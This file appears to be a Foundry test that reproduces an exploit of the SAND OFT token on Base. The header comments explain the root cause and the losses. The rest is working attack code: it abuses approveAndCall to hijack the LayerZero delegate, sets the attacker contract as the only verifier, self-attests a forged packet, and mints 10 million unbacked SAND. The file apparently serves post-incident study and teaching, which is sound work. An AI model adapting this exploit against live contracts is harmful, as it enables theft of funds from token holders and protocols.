// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "../basetest.sol";

// @KeyInfo - Total Lost : 10,000,000 unbacked SAND minted in this tx (~$517k face value).
// Campaign printed ~$49B face-value SAND across 400+ txs (Blockaid); PeckShield later
// counted ~14.9B SAND on two attacker addresses. Realized extractable value was far
// smaller (~$0.67M / ~80 ETH) because Base/BSC liquidity could not absorb the print.
// Attacker EOA      : 0x638Ccb18370eE228378a565c1d4D0F9620d7F296
// Attack contract   : 0xd7Cb71EE00a812FC22ACcfE08A2f59A5Add2f6Ca (CREATE'd in the attack tx)
// Vulnerable token  : 0xac531Eb26Ca1d21b85126De8FB87E80E09002DcF (OFTSand, SAND OFT on Base)
// EndpointV2        : 0x1a44076050125825900e736c501f859c50fE728c
// ReceiveUln302     : 0xc70AB6f32772f59fBfc23889Caf4Ba3376C84bAf
// Attack tx         : https://basescan.org/tx/0x76ed03844ff61520a0fb99278f92f2f1453b24ccbacd20b91131703e4a56a446
// Alert             : https://x.com/blockaid_/status/2091016046555582891
//
// Root cause: OFTSand.approveAndCall (inherited ERC20BasicApproveExtension) is a generic
// arbitrary-call primitive. The only guard is "first calldata word == msg.sender", which
// does not constrain the *target* or *selector*. Anyone can therefore make the token
// call EndpointV2.setDelegate(attacker) with msg.sender == the OFT, hijacking the
// LayerZero OApp delegate. As delegate they install themselves as the sole required DVN,
// self-attest a forged inbound packet, and Endpoint.lzReceive mints unbacked SAND via
// OFTSand._credit -> _mint. This is NOT a LayerZero bug; LZ contracts behaved as designed.

address constant ATTACKER = 0x638Ccb18370eE228378a565c1d4D0F9620d7F296;
address constant SAND = 0xac531Eb26Ca1d21b85126De8FB87E80E09002DcF;
address constant ENDPOINT = 0x1a44076050125825900e736c501f859c50fE728c;
address constant RECEIVE_ULN = 0xc70AB6f32772f59fBfc23889Caf4Ba3376C84bAf;

// Attack mined in Base block 50289412; fork one block earlier.
uint256 constant FORK_BLOCK = 50_289_411;

uint32 constant SRC_EID = 30101; // Ethereum mainnet LayerZero eid (forged source)
uint64 constant PACKET_NONCE = 455;
bytes32 constant SENDER = bytes32(uint256(uint160(SAND)));
bytes32 constant GUID = 0x41e1696e58458feb3b1ceaec165f0e716a748343cd930ecbfd9e7fea97ddf821;
bytes32 constant PAYLOAD_HASH = 0xe9858d4b29aa90b5ce5a637d3003273fc71a83a423bdbf5319235f2520f75403;

// 81-byte PacketV1 header: version|nonce|srcEid|sender|dstEid|receiver
// srcEid 30101 (ETH), dstEid 30184 (Base), sender=receiver=OFTSand (same address both chains).
bytes constant HEADER =
    hex"0100000000000001c700007595000000000000000000000000ac531eb26ca1d21b85126de8fb87e80e09002dcf000075e8000000000000000000000000ac531eb26ca1d21b85126de8fb87e80e09002dcf";

// OFT message: 32-byte toAddress (attacker EOA) + 8-byte amountSD (0x09184e72a000 = 1e13).
// amountSD * decimalConversionRate(1e12) = 1e25 = 10,000,000 SAND.
bytes constant MESSAGE = hex"000000000000000000000000638ccb18370ee228378a565c1d4d0f9620d7f296000009184e72a000";

struct Origin {
    uint32 srcEid;
    bytes32 sender;
    uint64 nonce;
}

struct SetConfigParam {
    uint32 eid;
    uint32 configType;
    bytes config;
}

struct UlnConfig {
    uint64 confirmations;
    uint8 requiredDVNCount;
    uint8 optionalDVNCount;
    uint8 optionalDVNThreshold;
    address[] requiredDVNs;
    address[] optionalDVNs;
}

interface IOFTSand {
    function approveAndCall(address target, uint256 amount, bytes calldata data) external payable returns (bytes memory);
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IEndpointV2 {
    function setDelegate(address _delegate) external;
    function setConfig(address oapp, address lib, SetConfigParam[] calldata params) external;
    function lzReceive(
        Origin calldata origin,
        address receiver,
        bytes32 guid,
        bytes calldata message,
        bytes calldata extraData
    ) external payable;
    function delegates(address oapp) external view returns (address);
}

interface IReceiveUln302 {
    function verify(bytes calldata packetHeader, bytes32 payloadHash, uint64 confirmations) external;
    function commitVerification(bytes calldata packetHeader, bytes32 payloadHash) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        // Online warm uses alias "base"; offline run_poc.sh rewrites to 127.0.0.1:8548.
        vm.createSelectFork("http://127.0.0.1:8548", FORK_BLOCK);

        fundingToken = SAND;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(SAND, "OFTSand");
        vm.label(ENDPOINT, "LayerZero EndpointV2");
        vm.label(RECEIVE_ULN, "ReceiveUln302");
    }

    function testExploit() public balanceLog {
        uint256 balBefore = IOFTSand(SAND).balanceOf(ATTACKER);
        uint256 supplyBefore = IOFTSand(SAND).totalSupply();

        UnknownHackExploit exploit = new UnknownHackExploit();
        exploit.attack();

        uint256 minted = IOFTSand(SAND).balanceOf(ATTACKER) - balBefore;
        emit log_named_decimal_uint("Unbacked SAND minted", minted, 18);
        assertEq(minted, 10_000_000 ether, "mint amount mismatch");
        assertEq(IOFTSand(SAND).totalSupply() - supplyBefore, minted, "totalSupply not inflated");
    }
}

/// @dev Teaching exploit: become the OFT's LayerZero delegate via approveAndCall, install
///      this contract as the sole required DVN, self-attest a forged packet, mint SAND.
contract UnknownHackExploit {
    uint8 internal constant NIL_DVN_COUNT = type(uint8).max;

    function attack() external {
        // 1. Hijack LayerZero delegate. approveAndCall requires the first calldata word
        //    to equal msg.sender (this contract). setDelegate(address) satisfies that,
        //    and EndpointV2.setDelegate writes delegates[msg.sender] — here msg.sender
        //    is the token, because the token performs the low-level call.
        // BytesUtil.doFirstParamEqualsAddress requires data.length >= 68 (selector +
        // two words). setDelegate only reads the first address word; the extra zero
        // word is padding so the length check passes.
        IOFTSand(SAND).approveAndCall(
            ENDPOINT,
            0,
            abi.encodeWithSelector(IEndpointV2.setDelegate.selector, address(this), bytes32(0))
        );

        // 2. As delegate, overwrite the OApp receive ULN config so this contract is
        //    the only required DVN. optionalDVNCount = 255 (NIL) means "no optional DVNs"
        //    rather than "inherit the default optional set".
        address[] memory dvns = new address[](1);
        dvns[0] = address(this);
        SetConfigParam[] memory params = new SetConfigParam[](1);
        params[0] = SetConfigParam({
            eid: SRC_EID,
            configType: 2, // CONFIG_TYPE_ULN
            config: abi.encode(
                UlnConfig({
                    confirmations: 1,
                    requiredDVNCount: 1,
                    optionalDVNCount: NIL_DVN_COUNT,
                    optionalDVNThreshold: 0,
                    requiredDVNs: dvns,
                    optionalDVNs: new address[](0)
                })
            )
        });
        IEndpointV2(ENDPOINT).setConfig(SAND, RECEIVE_ULN, params);

        // 3. Self-attest the forged inbound packet as that DVN, then commit it.
        IReceiveUln302(RECEIVE_ULN).verify(HEADER, PAYLOAD_HASH, 1);
        IReceiveUln302(RECEIVE_ULN).commitVerification(HEADER, PAYLOAD_HASH);

        // 4. Deliver the packet. Endpoint._clearPayload then OFTSand._lzReceive
        //    -> _credit -> _mint(attacker, 10_000_000e18) with no backing burn.
        Origin memory origin = Origin({srcEid: SRC_EID, sender: SENDER, nonce: PACKET_NONCE});
        IEndpointV2(ENDPOINT).lzReceive(origin, SAND, GUID, MESSAGE, "");
    }
}
